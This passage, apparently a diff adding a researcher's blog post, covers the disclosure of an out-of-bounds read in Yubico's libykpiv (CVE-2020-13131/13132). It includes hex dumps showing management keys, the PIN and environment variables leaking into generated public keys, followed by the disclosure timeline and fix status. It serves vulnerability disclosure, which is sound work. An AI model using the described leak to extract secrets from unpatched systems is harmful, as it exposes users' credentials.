+      2dc0 - 69 76 2d 74 6f 6f 6c 00-2d 73 39 61 00 2d 41 52   iv-tool.-s9a.-AR
+      2dd0 - 53 41 31 30 32 34 00 2d-61 67 65 6e 65 72 61 74   SA1024.-agenerat
+      2de0 - 65 00 2d 6b 34 32 34 32-34 32 34 32 34 32 34 32   e.-k424242424242
+      2df0 - 34 32 34 32 34 32 34 32-34 32 34 32 34 32 34 32   4242424242424242
+      2e00 - 34 32 34 32 34 32 34 32-34 32 34 32 34 32 34 32   4242424242424242
+      2e10 - 34 32 34 32 00 2d 70 31-32 33 34 00 53 48 45 4c   4242.-p1234.SHE
+</code></pre>
+<p>As you can see, the management key was chosen as a sequence of <code class="language-plaintext highlighter-rouge">0x42</code> in hexadecimal and the PIN as <code class="language-plaintext highlighter-rouge">1234</code>.
+<br />
+<br /></p>
+
+<p>Management keys entered interactively via <code class="language-plaintext highlighter-rouge">stdin</code> are also contained in the information leak:</p>
+<pre><code class="language-C">      08d0 - 00 00 00 00 00 00 00 00-00 00 00 00 00 42 42 42   .............BBB
+      08e0 - 42 42 42 42 42 42 42 42-42 42 42 42 42 00 00 00   BBBBBBBBBBBBB...
+</code></pre>
+<p><br /></p>
+
+<p>Depending on the segmentation fault risks that an attacker is willing to take, most bash environment variables that are present during the program execution can be dumped as well, although with a considerable risk of crashing if the out of bounds read exceeds process boundaries.</p>
+
+<p>Consider the following shell environment variable created with <code class="language-plaintext highlighter-rouge">export SECRET_ENV_VARIABLE=SECRET_VALUE</code> before running the vulnerable program. This is copied into the public key as well:</p>
+
+<pre><code class="language-C">      38a0 - 48 3d 3a 00 53 45 43 52-45 54 5f 45 4e 56 5f 56   H=:.SECRET_ENV_V
+      38b0 - 41 52 49 41 42 4c 45 3d-53 45 43 52 45 54 5f 56   ARIABLE=SECRET_V
+      38c0 - 41 4c 55 45 00 58 44 47-5f 53 45 53 53 49 4f 4e   ALUE.XDG_SESSION
+</code></pre>
+<p><br />
+This sort of information disclosure is particularly concerning for automated systems, which are often configured to hold secrets in environment variables.</p>
+
+<h2 id="note-on-older-cryptography-standards">Note on Older Cryptography Standards</h2>
+<p>Some readers might have noticed that RSA1024 and RSA2048 key generations are possible in the code, but RSA4096 generation is not. In fact, the stronger RSA with 4096bit length is missing simply because the PIV standard defined by NIST does not include it. Therefore it is not Yubico’s fault that libykpiv cannot offer this variant, and it would require an update to the PIV standard to allow this.</p>
+
+<p>However, it might be time to implement the recommendations by NIST (as outlined <a href="https://www.yubico.com/blog/comparing-asymmetric-encryption-algorithms/">here</a> by Yubico, <a href="https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final">current NIST document</a> p.59) to disallow new generation of relatively weak cryptographic keys such as RSA1024 by default to discourage their usage. For example, <code class="language-plaintext highlighter-rouge">yubico-piv-tool</code> could implement an additional flag to allow the creation of RSA1024 if explicitly requested and error out otherwise. I recommend implementing this in a future release of the code.</p>
+
+<h2 id="thoughts-on-this-attack-class">Thoughts on This Attack Class</h2>
+<p>It is not the first time that memory safety issues based on unchecked length fields are found in libykpiv, as documented in Eric Sesterhenn’s great talk <a href="https://media.ccc.de/v/35c3-9346-in_soviet_russia_smart_card_hacks_you">“In Soviet Russia Smart Card Hacks You”</a> and the related <a href="https://www.yubico.com/support/security-advisories/ysa-2018-03/">YSA-2018-03 advisory</a>. I discovered a conceptually similar length check issue in another Yubico library over a year ago, see the <a href="/posts/yubico-libu2f-host-vuln-part1/">libu2f-host vulnerabilities</a> article and the <a href="https://www.yubico.com/support/security-advisories/ysa-2019-01/">YSA-2019-01 advisory</a>.</p>
+
+<p>In my opinion, it is somewhat concerning that this general vulnerability pattern can still be found in cryptography-related Yubico software in 2020.</p>
+
+<p>I consider it very positive that Yubico’s host-side code is available as open-source. Among many other benefits for Yubico and the community, it allows easier code analysis by security researchers, which I consider very important for trustworthy cryptography. For example, the research presented here would not have happened without access to the source code. However, the previous history shows that code <strong>is not</strong> automatically audited “for free” in the necessary depth just because it is available in an open-source format, permissively licensed or used in a number of Unix and Windows driver contexts.</p>
+
+<p>The Yubico engineers and developers that I’ve been in contact with are competent and very dedicated. They are bringing a lot of fixes and improvements to the code as part of the constant maintenance efforts. However, I think Yubico should really consider investing more resources into this topic and systematically weed out these types of issues, particularly memory safety issues in the C code. The behavior of their drivers and libraries should be trustworthy and sane <strong>regardless</strong> of whether the input is coming from a malicious device or not. Cryptography-related code requires a high level of robustness.</p>
+
+<p>Improving this situation will require more eyes on the problem (<em>= additional resources and developer time</em>). An open bug bounty program with reasonably competitive rewards might help with this situation in the long run and bring in some creative approaches, but it obviously requires some engineering resources on it’s own for triage and resolution. At times, it may require spending extra developer time on low-quality reports. But while it is not a magic fix, I would personally welcome it as a reason to do more research on their code from time to time <em>;)</em></p>
+
+<p>In parallel, it might make sense to speed up the efforts to move to memory-safe languages where the environment permits this (CLI vs. drivers), as it is already done with tools such as <code class="language-plaintext highlighter-rouge">YubiKey Manager</code> which is written in Python. However, this is a complex topic on its own and largely out of scope here.</p>
+
+<h2 id="coordinated-disclosure">Coordinated Disclosure</h2>
+<p>I first contacted Yubico in April and reported a number of code issues, both via confidential disclosure emails to <code class="language-plaintext highlighter-rouge">security@</code> as well as via the public Github issue tracker (<em>after clearing them with the security contact</em>).</p>
+
+<p>During the disclosure process, I had the opportunity to coordinate closely on the subject of security assessments, evaluate the proposed security patches and give inputs for parts of the wording. This process was very positive - I value the trust and openness shown by the vendor by including me in their issue resolution. Although it is arguably also more unpaid work on the researcher side, it can be satisfying to participate in the low-level resolution efforts if the communication is very productive, which it was.</p>
+
+<p>Notably, the originally planned disclosure date was postponed on short notice. Since the disclosure was still well within the usual 90 days time frame and there were no signs that the issues are extremely dangerous or actively misused, I had no objections. From a researcher perspective, shorter disclosure time frames are obviously preferable, but I understand the necessity to balance this with other software development concerns.</p>
+
+<p>Overall, I am satisfied with the disclosure process.<br /></p>
+
+<h3 id="relevant-yubico-piv-tool--libykpiv-sources">Relevant yubico-piv-tool / libykpiv Sources</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>variant</th>
+      <th>source</th>
+      <th>fix</th>
+      <th>references</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Yubico upstream</td>
+      <td><a href="https://github.com/Yubico/yubico-piv-tool">Github</a></td>
+      <td><a href="https://github.com/Yubico/yubico-piv-tool/commit/ce76c1b25482d393744e817af72c3143c346027b">2.1.0</a></td>
+      <td><a href="https://www.yubico.com/support/security-advisories/ysa-2020-02/">YSA-2020-02 / YSA-2020-03</a>, <a href="https://developers.yubico.com/yubico-piv-tool/Release_Notes.html">changelog</a></td>
+    </tr>
+    <tr>
+      <td>Debian package</td>
+      <td><a href="https://packages.debian.org/source/bullseye/yubico-piv-tool">Debian</a></td>
+      <td>TBD</td>
+      <td><a href="https://security-tracker.debian.org/tracker/CVE-2020-13131">#1</a>, <a href="https://security-tracker.debian.org/tracker/CVE-2020-13132">#2</a></td>
+    </tr>
+    <tr>
+      <td>Ubuntu package</td>
+      <td><a href="https://launchpad.net/ubuntu/+source/yubico-piv-tool">Ubuntu</a></td>
+      <td>TBD</td>
+      <td><a href="https://people.canonical.com/~ubuntu-security/cve/2020/CVE-2020-13131.html">#1</a>, <a href="https://people.canonical.com/~ubuntu-security/cve/2020/CVE-2020-13132.html">#2</a></td>
+    </tr>
+    <tr>
+      <td>Arch package</td>
+      <td><a href="https://aur.archlinux.org/packages/yubico-piv-tool/">Arch</a></td>
+      <td>2.1.0-2</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Gentoo</td>
+      <td><a href="https://packages.gentoo.org/packages/sys-auth/yubico-piv-tool">Gentoo</a></td>
+      <td>2.1.1</td>
+      <td><a href="https://bugs.gentoo.org/732000">#732000</a></td>
+    </tr>
+    <tr>
+      <td>Fedora</td>
+      <td><a href="https://src.fedoraproject.org/rpms/yubico-piv-tool">Fedora</a></td>
+      <td>2.1.0-1.* , <a href="https://src.fedoraproject.org/rpms/yubico-piv-tool/c/66f72de25aa1c316721b38ee8dcab1d93e7a987a?branch=master">commit</a></td>
+      <td><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1855024">Bug 1855024</a></td>
+    </tr>
+    <tr>
+      <td>Mac homebrew</td>
+      <td><a href="https://formulae.brew.sh/formula/yubico-piv-tool">Homebrew</a></td>
+      <td>2.1.0</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="other-relevant-software">Other Relevant Software</h3>
+<p>Very late in the disclosure process (early July), I noticed the experimental <a href="https://github.com/iqlusioninc/yubikey-piv.rs">yubikey-piv.rs</a> project which had ported the affected Yubico C code to Rust.</p>
+
+<p>As far as I’m aware, they are not affected by the information leak aspects of CVE-2020-13131 since the out of bounds read will be mitigated in Rust by halting the program. Due to timing and other considerations, they were not included in the coordinated disclosure process.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>variant</th>
+      <th>source</th>
+      <th>fix</th>
+      <th>references</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>yubikey-piv.rs</td>
+      <td><a href="https://github.com/iqlusioninc/yubikey-piv.rs">Github</a></td>
+      <td>TBD</td>
+      <td><a href="https://github.com/iqlusioninc/yubikey-piv.rs/issues/152">GH152</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="detailed-timeline">Detailed Timeline</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Date</th>
+      <th>info</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>2020-04-29</td>
+      <td>Disclosure of the out of bounds read issue to Yubico</td>
+    </tr>
+    <tr>
+      <td>2020-04-30</td>
+      <td>Disclosure of the crash issue to Yubico</td>
+    </tr>
+    <tr>
+      <td>2020-04-30</td>
+      <td>Yubico confirms the issues</td>
+    </tr>
+    <tr>
+      <td>2020-05-07</td>
+      <td>Yubico communicates planned public disclosure date: 2020-06-08</td>
+    </tr>
+    <tr>
+      <td>2020-05-18</td>
+      <td>Yubico requests CVEs from MITRE</td>
+    </tr>
+    <tr>
+      <td>2020-06-08</td>
+      <td>Yubico postpones the public disclosure date</td>
+    </tr>
+    <tr>
+      <td>2020-06-18</td>
+      <td>Yubico communicates planned public disclosure date: 2020-07-01</td>
+    </tr>
+    <tr>
+      <td>2020-06-24</td>
+      <td>Yubico communicates planned public disclosure date: 2020-07-08</td>
+    </tr>
+    <tr>
+      <td>2020-07-08</td>
+      <td>Private heads-up to yubikey-piv.rs maintainer (<em>only high-level information</em>)</td>
+    </tr>
+    <tr>
+      <td>2020-07-08</td>
+      <td>Public disclosure of YSA-2020-02</td>
+    </tr>
+    <tr>
+      <td>2020-07-08</td>
+      <td>Publication of this blog post</td>
+    </tr>
+    <tr>
+      <td>2020-09-17</td>
+      <td>Updated blog post, including issue references and bugfix status</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="bug-bounty">Bug Bounty</h3>
+<p>Yubico provided a number of their hardware products as a bug bounty for this issue.</p>
+
+  </div>
+
+
+  <a class="u-url" href="/posts/yubico-libykpiv-vuln/" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col one-half"><ul class="contact-list">
+          <li class="p-name">
+            <b>Christian Reitter</b>
+          </li></ul></div>
+
+      <div class="footer-col one-half">
+        <p>Information security and other interests.</p>
+      </div>
+    </div>
+
+    <div class="social-ref"><ul class="social-ref-list"><li><a rel="me" href="https://github.com/invd" title="invd"><svg class="svg-icon grey"><use xlink:href="/assets/minima-icons.svg#github"></use></svg></a></li><li><a href="/feed.xml" title="rss"><svg class="svg-icon grey"><use xlink:href="/assets/minima-icons.svg#rss"></use></svg></a></li></ul>
+</div>
+
+  </div>
+</footer>
+</body>
+
+</html>
